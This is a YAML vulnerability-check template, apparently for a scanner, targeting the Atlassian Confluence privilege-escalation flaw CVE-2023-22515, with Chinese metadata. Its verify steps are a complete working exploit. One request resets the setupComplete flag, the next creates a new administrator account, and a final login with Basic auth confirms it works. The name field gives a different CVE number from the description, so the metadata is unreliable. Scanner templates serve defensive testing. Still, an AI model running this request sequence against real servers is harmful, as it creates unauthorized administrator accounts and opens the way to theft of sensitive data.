app: Atlassian Confluence
query: app:"Atlassian Confluence"
meta:
    name: CVE-2023-22505 账户权限提升漏洞
    level: 4
    tags:
        - ultra_vires
    description: Confluence 是由 Atlassian 开发的企业级协作软件。2023年10月，Atlassian 官方披露 CVE-2023-22515 Atlassian Confluence Data Center & Server 权限提升漏洞。攻击者可构造恶意请求创建管理员，从而登录系统，造成敏感信息泄漏等。
    homepage: https://www.atlassian.com/zh/software/confluence
    author: Prism X
    references: https://avd.aliyun.com/detail?id=AVD-2023-22515
    solution: 官方已发布安全更新，建议升级至最新版本。
    create_at: "2023-10-11 18:00:13"
    available: false
    steps:
        variable:
            - r1: randomLowercase(8)
            - r2: base64String("{{r1}}:{{r1}}")
        verify_steps:
            type: and
            verify:
                - request:
                    method: GET
                    path: /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
                    redirect: true
                    header: []
                    params: ""
                  response:
                    - name: code
                      value: "200"
                      type: equals
                - request:
                    method: POST
                    path: /setup/setupadministrator.action
                    redirect: true
                    header:
                        - Content-Type: application/x-www-form-urlencoded
                        - X-Atlassian-Token: no-check
                    params: username={{r1}}&fullName={{r1}}&email={{r1}}%40localhost&password={{r1}}&confirm={{r1}}&setup-next-button=Next
                  response:
                    - name: code
                      value: "200"
                      type: equals
                - request:
                    method: GET
                    path: /bootstrap/selectsetupstep.action
                    redirect: true
                    header: [ ]
                    params: ""
                  response:
                    - name: code
                      value: "200"
                      type: equals
                - request:
                    method: GET
                    path: /setup/finishsetup.action
                    redirect: true
                    header: []
                    params: ""
                  response:
                    - name: code
                      value: "200"
                      type: equals
                - request:
                    method: GET
                    path: /rest/api/user?username={{r1}}
                    redirect: true
                    header:
                        - Authorization: Basic {{r2}}
                        - X-Atlassian-Token: no-check
                    params: ""
                  response:
                    - name: body
                      value: profilePicture
                      type: contains
        exploit_steps:
            type: ""
            params:
                name: ""
                type: input
                value: ""
